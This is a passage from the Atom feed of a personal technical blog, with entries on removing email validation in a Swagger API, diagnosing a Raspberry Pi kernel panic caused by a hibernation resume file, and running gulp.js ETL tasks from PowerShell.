d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"email"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"jdoe@domain"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"id"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"a1b2c3"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"active"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"created"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"2021-09-26T15:02:01.328Z"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"lastUpdated"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"2021-09-26T15:02:01.328Z"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"firstName"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"John"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"lastName"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Doe"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"username"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"jdoe@domain"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Applying the same changes in the customer's environment resolved their issue!</p>
<p><strong>After note:</strong> Please be mindful before making this change in a production environment. Removing the whole email validation in this case wasn't dangerous since we did it in an internal/dev environment to prove a point. A change such as the one described here can make your application API vulnerable to different attack vectors.</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Email" term="Email"/>
        <category label="Regex" term="Regex"/>
        <category label="Web-dev" term="Web-dev"/>
        <category label="Swagger" term="Swagger"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fixing Ubuntu Hibernation]]></title>
        <id>https://kbbgl.github.io/blog/fixing-ubuntu-hibernation</id>
        <link href="https://kbbgl.github.io/blog/fixing-ubuntu-hibernation"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Introduction]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/fixing-ubuntu-hibernation#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>One day, seemingly out of the blue, my (using <a href="https://docusaurus.io/" target="_blank" rel="noopener noreferrer">Docusaurus</a> blog site, which is set up as an Ubuntu <code>systemd</code> service on the Raspberry Pi 4, stopped being accessible.</p>
<p>I tried pinging it and checking whether is it was connected to my local network but it was nowhere to be found. This meant that I needed to physically access the Raspberry Pi so I connected it to a monitor and reset it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="boot-no-good">Boot No Good<a href="https://kbbgl.github.io/blog/fixing-ubuntu-hibernation#boot-no-good" class="hash-link" aria-label="Direct link to Boot No Good" title="Direct link to Boot No Good">​</a></h2>
<p>Upon reboot, I was greeted by a console with the following worrying "Kernel panic" message:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/init: conf/conf.d/zz-resume-auto: line 1: syntax error: unexpected "{" </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.344964] Kernel panic - not syncing: Attempted to kill mitt exitcode=0x00000200 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.352769] CPU: 0 PID: 1 Comm: init Not tainted 5.19.0-1011-raspi #18-Ubuntu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.360029] Hardware name: Raspberry Pi 4 Model B Rev 1.4 (DT)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.365959] Call trace:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.368442]  dump_backtrace+Oxbc/Ox124</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.372260]  show_stackoN20/0x5c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.375625]  dump stack_lul4x88/Oxb4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.379349]  dump stack4x18/004</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.382714]  panic•Ox1b4/00ac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.385816]  do exit•ex518/0x520</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.389095]  do_group_exit4x3c/OxbO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.392726]  __Nake_gp_parent+Ox0/0x40</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.396534]  inuoke_syscall4x50/0x120</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.400343]  el6_suc_common.constprop.04.0x6c/Ox1a0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.405211]  do ele_suc+004/0x44</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.400577]  elesuc+040/0x180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.411768]  elOt_64_sync_handler+Oxf4/0x120</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.416106]  elOt_64_sync+Ox1a0/0x1A4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.419026] SNP: stopping secondary CPUs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.423813] Kernel Offset: Ox4b0c05400000 from Oxffff800008000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.430004] PHYS_OFFSET: Oxffffd932c0000000 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.434250] CPU features: Ox2000,04027810,00001086</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.439117] Memory Limit: none</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ 1.442221] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x00000200 ]--- </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The first line was the one that stood out. Seems that the file <code>zz-resume-auto</code> has a problem with the curly brackets within that context. At this time, I had to figure out a couple of things:</p>
<ol>
<li>What is this file <code>zz-resume-auto</code>?</li>
<li>Who writes to this file?</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="who-are-you-zz-resume-auto">Who are you <code>zz-resume-auto</code>?<a href="https://kbbgl.github.io/blog/fixing-ubuntu-hibernation#who-are-you-zz-resume-auto" class="hash-link" aria-label="Direct link to who-are-you-zz-resume-auto" title="Direct link to who-are-you-zz-resume-auto">​</a></h3>
<p>Since I couldn't access the Raspberry Pi remotely, I had to somehow be able to access it's filesystem without it booting. Since the Raspberry Pi's storage comes in a form of an SD card, I could just pull out the SD card from the slot on the Raspberry Pi, mount it onto an adapter and connect it to another computer.</p>
<p>After inserting the SD card adapter to one of the USB slots on my other machine, I ran the following command to create a directory for the Raspberry Pi filesystem and mounted the SD card onto it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># find the disk</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">fdisk</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disk /dev/sda: </span><span class="token number" style="color:#36acaa">59.48</span><span class="token plain"> GiB, </span><span class="token number" style="color:#36acaa">63864569856</span><span class="token plain"> bytes, </span><span class="token number" style="color:#36acaa">124735488</span><span class="token plain"> sectors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disk model: Card  Reader</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Units: sectors of </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> * </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sector size </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">logical/physical</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"> bytes / </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I/O size </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">minimum/optimal</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"> bytes / </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disklabel type: dos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disk identifier: 0x44eba349</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Device     Boot  Start       End   Sectors  Size Id Type</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/sda1  *      </span><span class="token number" style="color:#36acaa">2048</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">526335</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">524288</span><span class="token plain">  256M  c W95 FAT32 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LBA</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/sda2       </span><span class="token number" style="color:#36acaa">526336</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">124735454</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">124209119</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">59</span><span class="token plain">.2G </span><span class="token number" style="color:#36acaa">83</span><span class="token plain"> Linux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> /media/rpi/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> /dev/sda1/ /media/rpi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> /media/rpi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin   dev  home  lost+found  mnt  proc  run   snap  sys  usr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot  etc  lib   media       opt  root  sbin  srv   tmp  var</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Ubuntu" term="Ubuntu"/>
        <category label="Boot" term="Boot"/>
        <category label="Hibernation" term="Hibernation"/>
        <category label="Raspberry_pi" term="Raspberry_pi"/>
        <category label="Swap" term="Swap"/>
        <category label="Fs" term="Fs"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Run a Sequential gulp.js Task using PowerShell]]></title>
        <id>https://kbbgl.github.io/blog/gulpjs-task-using-powershell</id>
        <link href="https://kbbgl.github.io/blog/gulpjs-task-using-powershell"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/gulpjs-task-using-powershell#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>One of our largest and strategic customer recently requested to be able to execute an automated ETL pipeline from one of their Windows multinode cluster in a sequential manner.</p>
<p>The ETL pipeline has basically 3-stages:</p>
<ol>
<li>Initialize an import from their many data sources into a consolidated database on master node.</li>
<li>After the import step finishes, copy the flat files representing the consolidated database to the slave nodes.</li>
<li>After the copying step is completed, delete the old instance of the database from the slave nodes and launch the newly-copied database.</li>
</ol>
<p>The customer’s request rose out of a necessity because there was no way to perform this process in a sequential manner out-of-the-box as the product only by offered using scheduled manner. Since the Windows version of this feature was deprecated and no longer maintained, it was left up to Support to provide a crafty solution to this problem as R&amp;D and Product were not willing to put in hours to add this feature.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="starting-point">Starting Point<a href="https://kbbgl.github.io/blog/gulpjs-task-using-powershell#starting-point" class="hash-link" aria-label="Direct link to Starting Point" title="Direct link to Starting Point">​</a></h2>
<p>Although the product did not supply a way to perform the sequential task out-of-the-box, I did have a pretty solid ground to begin with.
On the master node, where the ETL process needs to initilize from, there were a few Windows Services running which allowed the non-sequential, scheduled build and copy operation to be done.
The first service was a management service written in .NET/C# that managed the consolidated database instances and exposed a CLI to be able to interact with them. Using this CLI, we’re able to start initialize the ETL process and refresh the remote databases after copying the flat files to the slave nodes.
The second service was a NodeJS application which wrapped a <a href="https://gulpjs.com/" target="_blank" rel="noopener noreferrer"><code>gulp.js</code></a> task initializer. The tasks were responsible for interacting with the first service using the CLI to perform the following operations:</p>
<ol>
<li>Initialize the ETL process.</li>
<li>After the ETL process finishes on the master node, synchronously copy the database flat files from the master node to the slave nodes.</li>
<li>Send a command to the slave nodes to restart the database instance with the copied flat files.</li>
</ol>
<p>The way product worked out-of-the-box is to read a configuration file which includes:</p>
<p>a. The cron pattern to initialize the <code>gulp</code> task represented by scheduler.schedule, <code>15 20 1 * *</code>.
b. The slave nodes’ remote copy location. This is where the flat files copied from the master node will be copied into the slave nodes. Represented by <code>dbN.slave_path</code>.
c. The name of the database for which to initialize the ETL process on the master node. Represented by <code>tasks.some_db_task.build.db</code>.
The configuration file (very redacted) looks something like this:</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token property" style="color:#36acaa">"db1"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token property" style="color:#36acaa">"db_name"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"SomeDB"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token property" style="color:#36acaa">"slave_path"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"\\\\slave_node_1_hostname\\C:\\path\\to\\SomeDB\\FlatFiles"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">"db1"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token property" style="color:#36acaa">"db_name"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"SomeDB"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token property" style="color:#36acaa">"slave_path"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"\\\\slave_node_2_hostname\\C:\\path\\to\\SomeDB\\FlatFiles"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">"scheduler"</span><span class="token operator" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><span class="token property" style="color:#36acaa">"task"</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">"some_db_task"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><span class="token property" style="color:#36acaa">"schedule"</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">"15 20 1 * *"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><span class="token property" style="color:#36acaa">"enabled"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"tasks"</span><span class="token operator" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token property" style="color:#36acaa">"some_db_task"</span><span class="token operator" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">"build"</span><span class="token operator" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               </span><span class="token property" style="color:#36acaa">"db"</span><span class="token operator" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  </span><span class="token string" style="color:#e3116c">"SomeDB"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">"distribute"</span><span class="token operator" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               </span><span class="token string" style="color:#e3116c">"db1.slave_path"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               </span><span class="token string" style="color:#e3116c">"db2.slave_path"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I figured, if I could find a way to launch the <code>gulp</code> task independently, in the example above <code>some_db_task</code>, and develop some logic to initialize it sequentially, I would be able to supply a solution to the customer.
The first step was to understand how <code>gulp</code> tasks worked.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="gulp-research"><code>gulp</code> Research<a href="https://kbbgl.github.io/blog/gulpjs-task-using-powershell#gulp-research" class="hash-link" aria-label="Direct link to gulp-research" title="Direct link to gulp-research">​</a></h2>
<p>After reviewing the source code of the NodeJS service which initializes the <code>gulp</code> tasks, I found that there are a few ways to run them:</p>
<ul>
<li>
<p>We can run the task using</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">node.exe /path/to/gulp.js</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>We can specify the task name according to what’s configured:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">node.exe /path/to/gulp.js some_db_task</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>Run it using <code>gulp</code>:</p>
